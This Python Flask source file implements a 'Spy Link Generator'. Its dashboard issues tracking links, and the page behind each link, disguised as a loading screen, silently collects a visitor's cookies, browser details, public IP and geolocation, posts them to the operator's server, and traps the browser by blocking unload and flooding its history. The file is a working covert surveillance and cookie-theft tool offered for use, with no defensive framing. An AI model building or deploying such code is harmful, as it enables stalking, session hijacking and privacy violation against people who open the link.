# -*- coding: utf-8 -*-
import os
import uuid
import json
from datetime import datetime
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)
reports = {}

#  HTML
DASHBOARD = """
<!DOCTYPE html>
<html>
<head><title>Spy Dashboard</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#0a0f1e;font-family:monospace;padding:20px;color:#0f0;}
.card{background:#111;border-radius:20px;padding:20px;margin-bottom:20px;border:1px solid #4affff;}
.input-group{display:flex;gap:10px;margin:15px 0;}
input{flex:1;background:#000;border:1px solid #4affff;padding:12px;color:#0f0;border-radius:10px;}
button{background:#4affff;color:#000;border:none;padding:12px 20px;border-radius:10px;cursor:pointer;}
pre{background:#000;padding:10px;border-radius:10px;overflow-x:auto;}
</style>
</head>
<body>
<div class="card">
<h2> SPY LINK GENERATOR</h2>
<p>           </p>
<div class="input-group">
<input type="text" id="link" value="{{ link }}" readonly>
<button onclick="copyLink()"></button>
</div>
</div>
<div class="card">
<h3>   (UID: {{ uid }})</h3>
<button onclick="location.reload()" style="margin-bottom:10px;"> </button>
<div id="reports">
{% if reports[uid] and reports[uid].data %}
    {% for item in reports[uid].data|reverse %}
        <div style="border-left:3px solid #ff3366; margin:10px 0; padding:10px; background:#0f1422;">
            <small>{{ item.time }}</small>
            <pre>{{ item.data | tojson(indent=2) }}</pre>
        </div>
    {% endfor %}
{% else %}
    <p>       </p>
{% endif %}
</div>
</div>
<script>
function copyLink(){ const i=document.getElementById('link'); i.select(); navigator.clipboard.writeText(i.value); alert('!'); }
setInterval(()=>location.reload(), 8000);
</script>
</body>
</html>
"""

SPY_PAGE = """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Loading...</title><style>body{background:#000;color:#0f0;text-align:center;padding-top:20%;font-family:monospace;}</style></head>
<body>
<h2>  ...</h2>
<p>   </p>
<script>
(async function(){
    const server = "{{ server }}";
    const uid = "{{ uid }}";
    function send(data){
        fetch(server+'/api/report/'+uid, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(e=>console.log);
    }
    let info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width+'x'+screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: document.cookie,
        localStorageSize: localStorage.length,
        url: location.href
    };
    send(info);
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(p=>{
            info.location = {lat:p.coords.latitude, lon:p.coords.longitude};
            send(info);
        },()=>{});
    }
    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{ info.ip=ip.ip; send(info); }).catch(()=>{});
    window.onbeforeunload = function(){ return true; };
    setInterval(()=>{ history.pushState({}, '', '/'); }, 200);
})();
</script>
</body></html>
"""

@app.route('/')
def home():
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    uid = str(uuid.uuid4())[:8]
    reports[uid] = {'data': []}
    link = request.host_url.rstrip('/') + '/spy/' + uid
    return render_template_string(DASHBOARD, link=link, uid=uid, reports=reports)

@app.route('/spy/<uid>')
def spy(uid):
    if uid not in reports:
        return "Invalid link", 404
    return render_template_string(SPY_PAGE, server=request.host_url.rstrip('/'), uid=uid)

@app.route('/api/report/<uid>', methods=['POST'])
def report(uid):
    if uid not in reports:
        return "Not found", 404
    data = request.get_json()
    reports[uid]['data'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'data': data
    })
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)